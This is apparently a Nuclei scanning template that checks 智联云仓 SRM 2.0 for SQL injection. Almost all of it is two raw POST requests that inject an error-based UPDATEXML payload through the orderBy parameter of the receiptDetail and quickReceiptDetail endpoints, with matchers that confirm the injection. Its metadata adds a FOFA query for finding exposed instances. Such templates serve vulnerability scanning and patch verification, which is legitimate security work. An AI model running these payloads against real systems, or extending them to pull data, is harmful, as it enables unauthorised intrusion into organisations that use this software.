id: zhilink-srm-quickReceiptDetail-or-receiptDetail-sqli
info:
  name: 智联云仓 SRM 2.0 quickReceiptDetail/receiptDetail - sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - demo
  metadata:
    verified: true
    fofa-query: title=="SRM 2.0"
  tags: srm,sqli,zhilink

http:
  - raw:
      - |
        POST /adpweb/api/srm/delivery/receiptDetail?orderBy=%28UPDATEXML%288058%2CCONCAT%280x2e%2C0x71707a7671%2C%28SELECT+%28ELT%288058%3D8058%2C1%29%29%29%2C0x71766a7671%29%2C3521%29%29 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: keep-alive

    matchers:
      - type: dsl
        name: receiptDetail_params
        dsl:
          - status_code == 200
          - contains(body,'qpzvq1qvjvq')
        condition: and

  - raw:
      - |
        POST /adpweb/api/srm/delivery/quickReceiptDetail?orderBy=%28UPDATEXML%288058%2CCONCAT%280x2e%2C0x71707a7671%2C%28SELECT+%28ELT%288058%3D8058%2C1%29%29%29%2C0x71766a7671%29%2C3521%29%29 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: keep-alive

    matchers:
      - type: dsl
        name: quickReceiptDetail_params
        dsl:
          - status_code == 200
          - contains(body,'qpzvq1qvjvq')
        condition: and